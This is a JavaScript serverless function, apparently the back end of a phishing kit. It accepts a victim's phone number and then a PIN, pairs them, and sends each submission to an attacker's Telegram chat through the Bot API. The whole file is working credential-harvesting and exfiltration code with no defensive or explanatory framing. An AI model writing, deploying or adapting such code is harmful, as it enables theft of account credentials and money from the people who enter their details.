import fetch from 'node-fetch';

// Configuration (Environment Variables)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Data storage for phone and PIN tracking
const clientData = {};

// Helper function to send a message to Telegram
async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorMessage = await response.text();
      console.error('Telegram API error:', errorMessage);
    }
  } catch (err) {
    console.error('Failed to send message to Telegram:', err);
  }
}

// Vercel API Function (Serverless Function)
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { phoneNumber, pinCode } = req.body;

  try {
    // Handle phone number submission
    if (phoneNumber && !pinCode) {
      // Remove any existing "waiting" phone number from clientData before adding the new one
      Object.keys(clientData).forEach((key) => {
        if (clientData[key].state === 'waiting') {
          console.log(`Deleting previous incomplete submission for: ${key}`);
          delete clientData[key];
        }
      });

      // Add the new phone number submission
      clientData[phoneNumber] = { pin: null, state: 'waiting' };

      console.log(`Received phone number: ${phoneNumber}`);
      await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);

      // Set a timeout to delete the phone number if no PIN is received within 5 minutes
      setTimeout(() => {
        if (clientData[phoneNumber]?.state === 'waiting') {
          console.log(`Deleting incomplete submission for: ${phoneNumber}`);
          delete clientData[phoneNumber];
        }
      }, 5 * 60 * 1000); // 5 minutes

      return res.status(200).json({ status: 'Phone number received. Waiting for PIN.' });
    }

    // Handle PIN code submission
    if (pinCode && !phoneNumber) {
      // Find the last phone number waiting for a PIN
      const waitingPhoneNumber = Object.keys(clientData).find(
        (key) => clientData[key].state === 'waiting' && clientData[key].pin === null
      );

      if (!waitingPhoneNumber) {
        return res.status(400).json({ error: 'No phone number waiting for a PIN.' });
      }

      // Update the state to completed
      clientData[waitingPhoneNumber] = { pin: pinCode, state: 'completed' };
      console.log(`Received PIN: ${pinCode} for phone number: ${waitingPhoneNumber}`);

      await sendTelegramMessage(
        `New Client Submission:\nPhone Number: ${waitingPhoneNumber}\nPIN Code: ${pinCode}`
      );

      // Remove the completed entry from the storage to free up memory
      delete clientData[waitingPhoneNumber];

      return res.status(200).json({ status: 'PIN code received and sent to Telegram.' });
    }

    return res.status(400).json({ error: 'Invalid data. Expected either phoneNumber or pinCode.' });
  } catch (error) {
    console.error('Error handling POST request:', error);
    return res.status(500).json({ error: 'Internal server error.' });
  }
}
